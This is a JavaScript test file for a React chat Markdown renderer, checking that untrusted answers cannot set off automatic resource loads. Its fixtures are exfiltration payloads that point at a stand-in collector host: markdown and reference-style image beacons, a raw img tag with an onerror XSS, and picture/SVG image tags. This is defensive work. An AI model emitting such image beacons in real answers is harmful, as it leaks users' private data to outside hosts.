import test from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { load } from "cheerio";
import { Markdown } from "../components/chat/markdown.tsx";

const collector = "https://synthetic-collector.invalid/pixel?value=PRIVATE_FIXTURE";
function render(text) {
  const html = renderToStaticMarkup(createElement(Markdown, { children: text }));
  const $ = load(html);
  assert.equal(
    $("img, picture, source, image, iframe, object, embed, [src], [srcset], link[rel=preload]").length,
    0,
    "Untrusted answers must not create automatic resource loads",
  );
  return $;
}

for (const [name, markdown] of [
  ["inline HTTPS image", `![Supplier badge](${collector})`],
  ["reference image", `![Supplier badge][badge]\n\n[badge]: ${collector}`],
  ["collapsed reference image", `![badge][]\n\n[badge]: ${collector}`],
  ["shortcut reference image", `![badge]\n\n[badge]: ${collector}`],
  ["same-origin image", "![Private file](/api/files/uploads/fictional-id)"],
  ["protocol-relative image", "![Badge](//synthetic-collector.invalid/pixel)"],
  ["image title and empty alt", `![](${collector} "Untrusted title")`],
  ["linked image", `[![Badge](${collector})](https://www.cbp.gov/trade)`],
  ["table image", `| Evidence |\n| --- |\n| ![Badge](${collector}) |`],
  ["raw HTML image", `<img src="${collector}" onerror="alert(1)">`],
  ["raw picture and SVG", `<picture><source srcset="${collector}"><img src="${collector}"></picture><svg><image href="${collector}" /></svg>`],
]) {
  test(`${name} cannot initiate an automatic request`, () => render(markdown));
}

test("blocked image keeps its label as inert text and drops URL/title attributes", () => {
  const $ = render(`![Supplier badge](${collector} "Untrusted title")`);
  assert.match($(".md-body").text(), /Supplier badge/);
  assert.equal($("[href], [title]").length, 0);
  assert.equal($(".md-body").html().includes(collector), false);
});

test("every streamed prefix and a reopened saved answer remain inert", () => {
  const answer = `Supplier assertion, not verified.\n\n![Supplier status][badge]\n\n[badge]: ${collector}`;
  for (let end = 0; end <= answer.length; end++) render(answer.slice(0, end));
  const reopened = JSON.parse(JSON.stringify({ text: answer }));
  render(reopened.text);
});

test("ordinary formatting, source links and code examples remain usable", () => {
  const $ = render(`# Finding\n\n**Review required.** [CBP](https://www.cbp.gov/trade)\n\n| Paid | Expected |\n| --- | --- |\n| $10 | $8 |\n\n\`![example](https://example.invalid/image)\``);
  assert.equal($("h1").text(), "Finding");
  assert.equal($("strong").text(), "Review required.");
  assert.equal($("table tbody td").length, 2);
  assert.equal($("a").attr("href"), "https://www.cbp.gov/trade");
  assert.equal($("a").attr("rel"), "noreferrer noopener");
  assert.match($("code").text(), /!\[example\]/);
});
